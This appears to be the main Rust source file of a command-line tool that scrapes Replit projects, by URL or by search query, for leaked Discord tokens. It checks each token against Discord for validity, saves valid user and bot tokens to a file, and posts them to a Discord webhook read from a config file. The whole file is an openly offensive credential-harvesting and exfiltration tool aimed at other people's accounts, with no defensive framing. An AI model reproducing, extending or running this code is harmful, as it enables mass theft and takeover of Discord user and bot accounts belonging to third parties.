use discord_api::{Discord, Webhook};
use repl_api::{ReplAPI, ReplGlobal, fetch_zip};
use ascii::{cli, options};
use util::{search_extract, write_file, fetch_lines};
use tokio::main;
use std::io::{stdin, stdout, Write};
use serde::Deserialize;
use serde_json::from_str;
use std::fs;
use reqwest::Client;


#[derive(Debug, Deserialize)]
struct Config {
    webhook: Option<String>
}


#[main()]
async fn main() {
    cli();
    loop {

        options();
        print!("\x1b[0;92mPlease enter an Option: [>]\x1b[0m ");
        stdout().flush().unwrap();
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Failed to read line");
        let option = option.trim().parse::<u32>();

        match option {
            Ok(option) => {
            match option {
                1 => {
                    let mut url = String::new();
                    print!("\x1b[0;92mExample URL: /@someone/repo\nPlease enter a URL to scrape: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut url)
                        .expect("Failed to read line");

                    let mut max = String::new();
                    print!("\x1b[0;92mPlease enter an amount to scrape: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut max)
                        .expect("Failed to read line");

                    let max = max.trim().parse::<u32>().unwrap();

                    scrape_url(url.trim(), max).await;
                },
                2 => check_tokens().await,



                3 => {
                    let mut query = String::new();
                    print!("\x1b[0;92mExample Query: discord\nPlease enter a Query to search: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut query)
                        .expect("Failed to read line");

                    let mut max = String::new();
                    print!("\x1b[0;92mPlease enter a max amount to scrape per URL: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut max)
                        .expect("Failed to read line");

                    let max = max.trim().parse::<u32>().unwrap();
                    auto_scrape(query.trim(), max).await
                },

                _ => continue
            }
            },
            Err(_) => continue
        }
    }

}

async fn auto_scrape(query: &str, max: u32) {
    let repl = ReplGlobal{};
    let urls = repl.fech_urls(query, max).await;
    let repl = ReplAPI{};
    let urls = repl.fetch_urls_global(urls).await;
    let client = Client::new();
    let mut count = 0;

    for url in urls {
        count += 1;
        let mut unchecked_tokens = vec![];
        if let Some(zip) = fetch_zip(client.clone(), url.clone(), count).await {
            let mut token = search_extract(zip, count).await;
            unchecked_tokens.append(&mut token);
        }
        let disc = Discord::new(unchecked_tokens.clone());
        let valid_users = disc.mass_check_user().await;
        println!("\x1b[0;34m
    ╔════════════════════════╬
    ║ Valid User Tokens: {}
    ║ Total invalid: {}
    ╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
        let valid_bots = disc.mass_check_bot().await;
        println!("\x1b[0;34m
    ╔════════════════════════╬
    ║ Valid Bot Tokens: {}
    ║ Total invalid: {}
    ╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
        write_file("valid.txt", "User Tokens:\n\n").await;
        for token in valid_users.clone() {
            write_file("valid.txt", &format!("{token}\n")).await;
        }
        write_file("valid.txt", "Bot Tokens:\n\n").await;
        for token in valid_bots.clone() {
            write_file("valid.txt", &format!("{token}\n")).await;
        }
        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
        if let Ok(config) = config {
            if let Some(webhook) = config.webhook {
                let web = Webhook::new(&webhook);
                web.send(&url, "User", valid_users).await;
                web.send(&url, "Bot", valid_bots).await;
            }
        }

    }
}

async fn check_tokens() {
    let unchecked_tokens = fetch_lines("./false_tokens.txt");
    let disc = Discord::new(unchecked_tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid User Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid Bot Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send("None", "User", valid_users).await;
            web.send("None", "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}

async fn scrape_url(url: &str, count: u32) {
    let repl = ReplAPI{};
    let data = repl.fetch_zips_url(url, count).await;
    let mut unchecked_tokens = vec![];
    let mut count = 0;
    for zip in data {
        count += 1;
        let mut token = search_extract(zip, count).await;
        unchecked_tokens.append(&mut token);
    }
    for token in unchecked_tokens.clone() {
        write_file("false_tokens.txt", &format!("{token}\n")).await;
    }
    let disc = Discord::new(unchecked_tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid User Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid Bot Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(url, "User", valid_users).await;
            web.send(url, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}